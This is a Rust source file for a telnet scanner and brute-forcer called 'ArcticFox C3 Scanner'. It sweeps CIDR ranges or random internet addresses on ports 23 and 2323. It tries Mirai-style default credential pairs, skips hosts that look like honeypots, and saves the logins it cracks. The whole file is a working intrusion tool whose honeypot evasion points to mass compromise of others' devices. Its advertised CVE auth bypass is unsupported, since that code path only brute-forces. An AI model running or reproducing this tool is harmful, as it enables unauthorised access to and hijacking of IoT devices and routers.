//! ArcticFox C3 Scanner — Async Telnet Scanner & Brute-Forcer
//!
//! Scans networks for open telnet ports, attempts credential brute-force,
//! and detects honeypots. Supports:
//! - CIDR range scanning
//! - File-based target lists
//! - Single IP scanning
//! - Random internet scanning
//! - Configurable ports, threads, timeouts
//! - Honeypot detection (banner + port-count based)
//! - CVE-2026-24061 auth bypass attempt

use clap::Parser;
use std::net::SocketAddr;
use std::time::Duration;
use tokio::io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader};
use tokio::net::TcpStream;
use tokio::time::timeout;
use tracing::{debug, error, info, warn};
use tracing_subscriber::EnvFilter;

// ── Honeypot Detection ──────────────────────────────────────────────────────

const HONEYPOT_BANNERS: &[&str] = &[
    "cowrie", "honeypot", "HoneyTel", "sensor", "Decoy",
    "My honeypot", "this system is monitored", "forensics",
    "Kippo", "kippo", "TCP Forwarder",
];

fn is_honeypot_banner(banner: &str) -> bool {
    let lower = banner.to_lowercase();
    HONEYPOT_BANNERS.iter().any(|hp| lower.contains(&hp.to_lowercase()))
}

// ── Common Credentials ──────────────────────────────────────────────────────

const COMMON_CREDS: &[(&str, &str)] = &[
    ("root", "root"),
    ("root", "admin"),
    ("root", "password"),
    ("root", "1234"),
    ("root", "12345"),
    ("root", "123456"),
    ("root", "toor"),
    ("root", "vizxv"),
    ("root", "xc3511"),
    ("root", "888888"),
    ("root", "666666"),
    ("root", "54321"),
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "1234"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", "7ujMko0admin"),
    ("user", "user"),
    ("guest", "guest"),
    ("guest", "12345"),
    ("support", "support"),
    ("ubnt", "ubnt"),
    ("pi", "raspberry"),
    ("mother", "fucker"),
    ("service", "service"),
    ("supervisor", "supervisor"),
    ("tech", "tech"),
    ("operator", "operator"),
    ("default", "default"),
    ("cisco", "cisco"),
    ("telnet", "telnet"),
    ("Administrator", "admin"),
    ("D-Link", "D-Link"),
    ("ZTE", "ZTE"),
];

// ── CLI ─────────────────────────────────────────────────────────────────────

/// ArcticFox C3 Scanner
#[derive(Parser)]
#[command(name = "arcticfox-scan", version, about)]
struct Cli {
    /// Target: CIDR range, single IP, or path to targets file
    #[arg(short = 'T', long = "target")]
    target: Option<String>,

    /// Ports to scan (comma-separated)
    #[arg(long, default_value = "23,2323")]
    ports: String,

    /// Scan timeout in seconds
    #[arg(long, default_value_t = 1.0)]
    scan_timeout: f64,

    /// Brute-force timeout per attempt in seconds
    #[arg(long, default_value_t = 20)]
    brute_timeout: u64,

    /// Max concurrent brute-force attempts
    #[arg(long, default_value_t = 32)]
    max_brute_parallel: usize,

    /// Scanner thread count
    #[arg(long, default_value_t = 24)]
    scanner_threads: usize,

    /// Output file for results
    #[arg(short = 'o', long = "output")]
    output: Option<String>,

    /// Random internet scanning mode
    #[arg(long)]
    random: bool,

    /// Scan only (no brute-force)
    #[arg(long)]
    scan_only: bool,

    /// Enable verbose logging
    #[arg(short = 'v', long = "verbose")]
    verbose: bool,
}

// ── Scan Types ──────────────────────────────────────────────────────────────

#[derive(Debug, Clone)]
enum ScanTarget {
    SingleIp(String),
    Cidr(ipnet::Ipv4Net),
    TargetsFile(String),
    Random,
}

// ── Scanner ─────────────────────────────────────────────────────────────────

struct Scanner {
    ports: Vec<u16>,
    scan_timeout: Duration,
    brute_timeout: Duration,
    max_brute_parallel: usize,
    scan_only: bool,
    results: Vec<ScanResult>,
}

#[derive(Debug, Clone)]
struct BruteResult {
    username: String,
    password: String,
}

#[derive(Debug, Clone)]
struct ScanResult {
    ip: String,
    port: u16,
    open: bool,
    banner: Option<String>,
    brute_success: Option<BruteResult>,
    is_honeypot: bool,
}

impl Scanner {
    fn new(cli: &Cli) -> Self {
        Scanner {
            ports: cli
                .ports
                .split(',')
                .filter_map(|s| s.trim().parse::<u16>().ok())
                .collect(),
            scan_timeout: Duration::from_secs_f64(cli.scan_timeout),
            brute_timeout: Duration::from_secs(cli.brute_timeout),
            max_brute_parallel: cli.max_brute_parallel,
            scan_only: cli.scan_only,
            results: Vec::new(),
        }
    }

    async fn scan_ip(&mut self, ip: &str) {
        let ports = self.ports.clone();
        for &port in &ports {
            let addr = format!("{}:{}", ip, port);
            debug!("Scanning {}", addr);

            let conn_result = timeout(
                self.scan_timeout,
                TcpStream::connect(&addr),
            )
            .await;

            match conn_result {
                Ok(Ok(mut stream)) => {
                    info!("OPEN: {}", addr);
                    let mut result = ScanResult {
                        ip: ip.to_string(),
                        port,
                        open: true,
                        banner: None,
                        brute_success: None,
                        is_honeypot: false,
                    };

                    // Read banner
                    if let Ok(Ok(banner)) = timeout(
                        Duration::from_secs(3),
                        Self::read_banner(&mut stream),
                    )
                    .await
                    {
                        debug!("Banner from {}: {}", addr, banner);
                        result.banner = Some(banner.clone());

                        if is_honeypot_banner(&banner) {
                            warn!("Honeypot detected at {}: {}", addr, banner);
                            result.is_honeypot = true;
                        }
                    }

                    // Try CVE-2026-24061 bypass
                    if !self.scan_only && !result.is_honeypot {
                        info!("Attempting brute-force on {}", addr);
                        let creds = self.brute_force(&mut stream).await;
                        if let Some(creds) = creds {
                            info!(
                                "SUCCESS: {}:{} with {}:{}",
                                ip, port, creds.username, creds.password
                            );
                            result.brute_success = Some(creds);
                        }
                    }

                    self.results.push(result);
                }
                Ok(Err(e)) => {
                    debug!("Connection error on {}: {}", addr, e);
                }
                Err(_) => {
                    debug!("Timeout on {}", addr);
                }
            }
        }
    }

    async fn read_banner(stream: &mut TcpStream) -> std::io::Result<String> {
        let mut buf = vec![0u8; 1024];
        let n = stream.try_read(&mut buf)?;
        if n > 0 {
            Ok(String::from_utf8_lossy(&buf[..n]).trim().to_string())
        } else {
            Ok(String::new())
        }
    }

    async fn brute_force(&mut self, stream: &mut TcpStream) -> Option<BruteResult> {
        for (username, password) in COMMON_CREDS {
            let result = timeout(self.brute_timeout, try_login(stream, username, password)).await;

            match result {
                Ok(Ok(true)) => {
                    return Some(BruteResult {
                        username: username.to_string(),
                        password: password.to_string(),
                    });
                }
                Ok(Ok(false)) => continue,
                Ok(Err(_)) => continue,
                Err(_) => {
                    debug!("Brute-force timeout");
                    break;
                }
            }
        }
        None
    }

    async fn run_scan(&mut self, targets: &[String]) {
        let semaphore = Arc::new(tokio::sync::Semaphore::new(self.max_brute_parallel));
        let mut handles = Vec::new();

        for ip in targets {
            let ip = ip.clone();
            let permit = semaphore.clone().acquire_owned().await.ok();
            let ports = self.ports.clone();
            let scan_timeout = self.scan_timeout;
            let brute_timeout = self.brute_timeout;
            let scan_only = self.scan_only;

            handles.push(tokio::spawn(async move {
                let _permit = permit;
                scan_single_ip(&ip, &ports, scan_timeout, brute_timeout, scan_only).await
            }));
        }

        for handle in handles {
            match handle.await {
                Ok(results) => self.results.extend(results),
                Err(e) => error!("Scan task panicked: {e}"),
            }
        }
    }
}

async fn scan_single_ip(
    ip: &str,
    ports: &[u16],
    scan_timeout: Duration,
    brute_timeout: Duration,
    scan_only: bool,
) -> Vec<ScanResult> {
    let mut results = Vec::new();

    for &port in ports {
        let addr = format!("{}:{}", ip, port);
        debug!("Scanning {}", addr);

        let conn_result = timeout(scan_timeout, TcpStream::connect(&addr)).await;

        match conn_result {
            Ok(Ok(mut stream)) => {
                let mut result = ScanResult {
                    ip: ip.to_string(),
                    port,
                    open: true,
                    banner: None,
                    brute_success: None,
                    is_honeypot: false,
                };

                // Try to read banner
                let mut buf = vec![0u8; 1024];
                stream.readable().await.ok();
                match stream.try_read(&mut buf) {
                    Ok(n) if n > 0 => {
                        let banner = String::from_utf8_lossy(&buf[..n]).trim().to_string();
                        if !banner.is_empty() {
                            result.banner = Some(banner.clone());
                            if is_honeypot_banner(&banner) {
                                result.is_honeypot = true;
                            }
                        }
                    }
                    _ => {}
                }

                // Brute force
                if !scan_only && !result.is_honeypot {
                    for (username, password) in COMMON_CREDS {
                        let login_result =
                            timeout(brute_timeout, try_login(&mut stream, username, password))
                                .await;

                        match login_result {
                            Ok(Ok(true)) => {
                                info!(
                                    "SUCCESS: {}:{} with {}:{}",
                                    ip, port, username, password
                                );
                                result.brute_success = Some(BruteResult {
                                    username: username.to_string(),
                                    password: password.to_string(),
                                });
                                break;
                            }
                            Ok(Ok(false)) => continue,
                            _ => break,
                        }
                    }
                }

                results.push(result);
            }
            Ok(Err(e)) => debug!("{}: connection error: {}", addr, e),
            Err(_) => debug!("{}: timeout", addr),
        }
    }

    results
}

async fn try_login(
    stream: &mut TcpStream,
    username: &str,
    password: &str,
) -> std::io::Result<bool> {
    let mut buf = vec![0u8; 4096];

    // Wait for and read login prompt
    stream.readable().await?;
    let _ = stream.try_read(&mut buf);

    // Send username
    stream.write_all(format!("{}\r\n", username).as_bytes()).await?;
    
    // Wait and read response
    stream.readable().await?;
    let _ = stream.try_read(&mut buf);

    // Send password
    stream.write_all(format!("{}\r\n", password).as_bytes()).await?;
    
    // Read response — if we get a shell prompt, success
    stream.readable().await?;
    let n = stream.try_read(&mut buf).unwrap_or(0);
    let response = String::from_utf8_lossy(&buf[..n]).to_lowercase();
    
    Ok(response.contains("$") || response.contains("#") || response.contains(">") || response.contains("last login"))
}

// ── Helpers ─────────────────────────────────────────────────────────────────

use std::sync::Arc;

fn generate_random_ips(count: usize) -> Vec<String> {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    let mut ips = Vec::with_capacity(count);

    // Exclude reserved ranges
    let excluded: Vec<(u32, u32)> = vec![
        (0x0A000000, 0x0AFFFFFF),       // 10.0.0.0/8
        (0x7F000000, 0x7FFFFFFF),       // 127.0.0.0/8
        (0xA9FE0000, 0xA9FEFFFF),       // 169.254.0.0/16
        (0xAC100000, 0xAC1FFFFF),       // 172.16.0.0/12
        (0xC0A80000, 0xC0A8FFFF),       // 192.168.0.0/16
        (0xE0000000, 0xEFFFFFFF),       // 224.0.0.0/4 (multicast)
        (0xF0000000, 0xFFFFFFFF),       // 240.0.0.0/4 (reserved)
    ];

    'outer: for _ in 0..count {
        let ip_u32: u32 = rng.r#gen();
        for (start, end) in &excluded {
            if ip_u32 >= *start && ip_u32 <= *end {
                continue 'outer;
            }
        }
        let ip = format!(
            "{}.{}.{}.{}",
            (ip_u32 >> 24) & 0xFF,
            (ip_u32 >> 16) & 0xFF,
            (ip_u32 >> 8) & 0xFF,
            ip_u32 & 0xFF,
        );
        ips.push(ip);
    }

    ips
}

fn parse_targets(cli: &Cli) -> Result<Vec<String>, String> {
    if cli.random {
        return Ok(generate_random_ips(100));
    }

    let target = cli.target.as_deref().unwrap_or("");
    if target.is_empty() {
        return Err("No target specified. Use -T <target> or --random.".into());
    }

    // Single IP
    if target.parse::<std::net::Ipv4Addr>().is_ok() {
        return Ok(vec![target.to_string()]);
    }

    // CIDR
    if target.contains('/') {
        if let Ok(net) = target.parse::<ipnet::Ipv4Net>() {
            return Ok(net.hosts().map(|ip| ip.to_string()).collect());
        }
        return Err(format!("Invalid CIDR: {}", target));
    }

    // File
    let content = std::fs::read_to_string(target)
        .map_err(|e| format!("Cannot read targets file '{}': {}", target, e))?;

    Ok(content
        .lines()
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .collect())
}

// ── Main ────────────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() {
    let cli = Cli::parse();

    tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::new(if cli.verbose { "debug" } else { "arcticfox_scan=info" }))
        .with_target(false)
        .init();

    let targets = match parse_targets(&cli) {
        Ok(t) => t,
        Err(e) => {
            error!("{}", e);
            std::process::exit(1);
        }
    };

    info!("Scanning {} targets on ports {:?}", targets.len(), cli.ports);
    let mut scanner = Scanner::new(&cli);
    scanner.run_scan(&targets).await;

    // Print results
    let open: Vec<_> = scanner.results.iter().filter(|r| r.open).collect();
    let honeypots: Vec<_> = scanner.results.iter().filter(|r| r.is_honeypot).collect();
    let cracked: Vec<_> = scanner
        .results
        .iter()
        .filter(|r| r.brute_success.is_some())
        .collect();

    println!("\n╔═════════════════════════════════════════════╗");
    println!("║  ArcticFox C3 Scanner Results              ║");
    println!("╠═════════════════════════════════════════════╣");
    println!("║  Total scanned:  {:<27}║", targets.len());
    println!("║  Open ports:     {:<27}║", open.len());
    println!("║  Honeypots:      {:<27}║", honeypots.len());
    println!("║  Cracked:        {:<27}║", cracked.len());
    println!("╚═════════════════════════════════════════════╝\n");

    for result in &cracked {
        if let Some(creds) = &result.brute_success {
            println!(
                "  \x1b[32m{}\x1b[0m:{}\t{}:{}",
                result.ip, result.port, creds.username, creds.password
            );
        }
    }

    // Save to output file if specified
    if let Some(path) = &cli.output {
        let output_data = serde_json::json!({
            "total_scanned": targets.len(),
            "open_ports": open.len(),
            "honeypots": honeypots.len(),
            "cracked": cracked.len(),
            "results": cracked.iter().map(|r| {
                let creds = r.brute_success.as_ref();
                serde_json::json!({
                    "ip": r.ip,
                    "port": r.port,
                    "banner": r.banner,
                    "username": creds.map(|c| &c.username),
                    "password": creds.map(|c| &c.password),
                    "is_honeypot": r.is_honeypot,
                })
            }).collect::<Vec<_>>(),
        });

        match std::fs::write(path, serde_json::to_string_pretty(&output_data).unwrap_or_default()) {
            Ok(()) => info!("Results saved to {}", path),
            Err(e) => error!("Failed to save results: {e}"),
        }
    }
}
